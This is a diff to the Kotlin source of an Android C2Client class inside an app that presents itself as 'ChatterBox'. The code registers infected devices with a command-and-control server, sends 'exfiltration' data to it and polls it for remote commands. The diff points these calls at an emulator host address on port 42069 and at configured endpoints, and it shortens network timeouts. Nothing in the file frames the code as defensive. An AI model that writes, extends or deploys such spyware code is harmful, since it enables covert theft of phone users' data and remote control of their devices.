@@ -80,22 +80,14 @@ class C2Client(private val context: Context) {
         // Log the data we're going to send for debugging
         Log.d(TAG, "Registration data: $registrationData")
         
-        // Try HTTPS endpoint first
-        Log.d(TAG, "Trying HTTPS endpoint: ${C2Config.REGISTRATION_ENDPOINT}")
-        SendDataTask(C2Config.REGISTRATION_ENDPOINT, registrationData.toString()).execute()
+        // For emulator testing, make direct connection to host through 10.0.2.2:42069
+        Log.d(TAG, "Connecting to C2 on emulator special address: http://10.0.2.2:42069/register")
+        SendDataTask("http://10.0.2.2:42069/register", registrationData.toString()).execute()
         
-        // Try HTTP endpoint as fallback
-        Log.d(TAG, "Trying HTTP endpoint: ${C2Config.HTTP_REGISTRATION_ENDPOINT}")
-        SendDataTask(C2Config.HTTP_REGISTRATION_ENDPOINT, registrationData.toString()).execute()
-        
-        // Also try local endpoint as final fallback
-        Log.d(TAG, "Trying local endpoint: ${C2Config.LOCAL_SERVER_URL}/register")
-        SendDataTask("${C2Config.LOCAL_SERVER_URL}/register", registrationData.toString()).execute()
-        
-        // Try direct IP address as extreme fallback
-        // This will help diagnose if there's a DNS resolution issue
-        Log.d(TAG, "Trying direct IP endpoint: http://127.0.0.1:42069/register")
-        SendDataTask("http://127.0.0.1:42069/register", registrationData.toString()).execute()
+        // Try configured URLs as fallback
+        Log.d(TAG, "Trying configured endpoints")
+        SendDataTask("${C2Config.SERVER_URL}/register", registrationData.toString()).execute()
+        SendDataTask("${C2Config.EMULATOR_SERVER_URL}/register", registrationData.toString()).execute()
     }
     
     /**
@@ -119,21 +111,14 @@ class C2Client(private val context: Context) {
         // Log for debugging
         Log.d(TAG, "Exfiltration data (first 100 chars): ${jsonStr.take(100)}...")
         
-        // Try HTTPS endpoint first
-        Log.d(TAG, "Trying HTTPS exfil endpoint: ${C2Config.EXFILTRATION_ENDPOINT}")
-        SendDataTask(C2Config.EXFILTRATION_ENDPOINT, jsonStr).execute()
+        // For emulator testing, make direct connection to host through 10.0.2.2:42069
+        Log.d(TAG, "Sending to C2 on emulator special address: http://10.0.2.2:42069/exfil")
+        SendDataTask("http://10.0.2.2:42069/exfil", jsonStr).execute()
         
-        // Try HTTP endpoint as fallback
-        Log.d(TAG, "Trying HTTP exfil endpoint: ${C2Config.HTTP_EXFILTRATION_ENDPOINT}")
-        SendDataTask(C2Config.HTTP_EXFILTRATION_ENDPOINT, jsonStr).execute()
-        
-        // Try local endpoint as final fallback
-        Log.d(TAG, "Trying local exfil endpoint: ${C2Config.LOCAL_SERVER_URL}/exfil")
-        SendDataTask("${C2Config.LOCAL_SERVER_URL}/exfil", jsonStr).execute()
-        
-        // Try direct IP as extreme fallback
-        Log.d(TAG, "Trying direct IP exfil endpoint: http://127.0.0.1:42069/exfil")
-        SendDataTask("http://127.0.0.1:42069/exfil", jsonStr).execute()
+        // Try configured URLs as fallback
+        Log.d(TAG, "Trying configured endpoints")
+        SendDataTask("${C2Config.EXFILTRATION_ENDPOINT}", jsonStr).execute()
+        SendDataTask("${C2Config.EMULATOR_SERVER_URL}/exfil", jsonStr).execute()
     }
     
     /**
@@ -156,21 +141,14 @@ class C2Client(private val context: Context) {
         // Log for debugging
         Log.d(TAG, "Command request data: $requestStr")
         
-        // Try HTTPS endpoint first
-        Log.d(TAG, "Trying HTTPS command endpoint: ${C2Config.COMMAND_ENDPOINT}")
+        // For emulator testing, make direct connection to host through 10.0.2.2:42069
+        Log.d(TAG, "Checking commands on emulator special address: http://10.0.2.2:42069/command")
+        GetCommandsTask(callback, "http://10.0.2.2:42069/command").execute(requestStr)
+        
+        // Try configured URLs as fallback
+        Log.d(TAG, "Trying configured endpoints")
         GetCommandsTask(callback, C2Config.COMMAND_ENDPOINT).execute(requestStr)
-        
-        // Try HTTP endpoint as fallback
-        Log.d(TAG, "Trying HTTP command endpoint: ${C2Config.HTTP_COMMAND_ENDPOINT}")
-        GetCommandsTask(callback, C2Config.HTTP_COMMAND_ENDPOINT).execute(requestStr)
-        
-        // Try local endpoint as final fallback
-        Log.d(TAG, "Trying local command endpoint: ${C2Config.LOCAL_SERVER_URL}/command")
-        GetCommandsTask(callback, "${C2Config.LOCAL_SERVER_URL}/command").execute(requestStr)
-        
-        // Try direct IP as extreme fallback
-        Log.d(TAG, "Trying direct IP command endpoint: http://127.0.0.1:42069/command")
-        GetCommandsTask(callback, "http://127.0.0.1:42069/command").execute(requestStr)
+        GetCommandsTask(callback, "${C2Config.EMULATOR_SERVER_URL}/command").execute(requestStr)
     }
     
     /**
@@ -283,8 +261,8 @@ class C2Client(private val context: Context) {
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
                 connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
-                connection.connectTimeout = 15000 // 15 seconds timeout
-                connection.readTimeout = 15000
+                connection.connectTimeout = 3000 // 3 seconds timeout
+                connection.readTimeout = 3000
                 connection.doOutput = true
                 connection.doInput = true
                 
@@ -299,36 +277,39 @@ class C2Client(private val context: Context) {
                         writer.flush()
                     }
                     
-                    // Check the response
+                    // Check response and read any data
                     val responseCode = connection.responseCode
-                    Log.d(TAG, "C2 server response code: $responseCode for $endpoint")
+                    val responseMessage = connection.responseMessage
+                    Log.d(TAG, "Connection to $endpoint - response code: $responseCode - $responseMessage")
                     
-                    // Read the response data
+                    // Try to read any response
                     var responseData = ""
-                    if (responseCode == HttpURLConnection.HTTP_OK) {
-                        val reader = BufferedReader(InputStreamReader(connection.inputStream))
-                        var line: String?
-                        val response = StringBuilder()
-                        while (reader.readLine().also { line = it } != null) {
-                            response.append(line)
-                        }
-                        responseData = response.toString()
-                        Log.d(TAG, "Server response: $responseData")
+                    try {
+                    val inputStream = if (responseCode >= 400) {
+                        Log.d(TAG, "Reading from error stream due to error code: $responseCode")
+                        connection.errorStream ?: connection.inputStream
                     } else {
-                        // Try to read error response
-                        try {
-                            val reader = BufferedReader(InputStreamReader(connection.errorStream))
-                            var line: String?
-                            val response = StringBuilder()
-                            while (reader.readLine().also { line = it } != null) {
-                                response.append(line)
-                            }
-                            responseData = response.toString()
-                            Log.e(TAG, "Server error response from $endpoint: $responseData")
-                        } catch (e: Exception) {
-                            Log.e(TAG, "Could not read error response from $endpoint", e)
-                        }
+                        connection.inputStream
                     }
+                    
+                        // Read the response data completely
+                    val reader = BufferedReader(InputStreamReader(inputStream))
+                    val response = StringBuilder()
+                    var line: String? = null
+                    while (reader.readLine().also { line = it } != null) {
+                    response.append(line).append("\n")
+                    }
+                    responseData = response.toString()
+                    
+                    // Log response completely for debugging
+                    if (responseData.isNotEmpty()) {
+                        Log.d(TAG, "Full response body from $endpoint: $responseData")
+                    } else {
+                        Log.d(TAG, "No response body from $endpoint")
+                        }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error reading response from $endpoint", e)
+                }
                     
                     return Pair(responseCode == HttpURLConnection.HTTP_OK, responseData)
                 } catch (e: Exception) {
@@ -390,8 +371,8 @@ class C2Client(private val context: Context) {
                 connection.requestMethod = "POST"
                 connection.setRequestProperty("Content-Type", "application/json")
                 connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
-                connection.connectTimeout = 15000 // 15 seconds timeout
-                connection.readTimeout = 15000
+                connection.connectTimeout = 3000 // 3 seconds timeout
+                connection.readTimeout = 3000
                 connection.doOutput = true
                 connection.doInput = true
                 
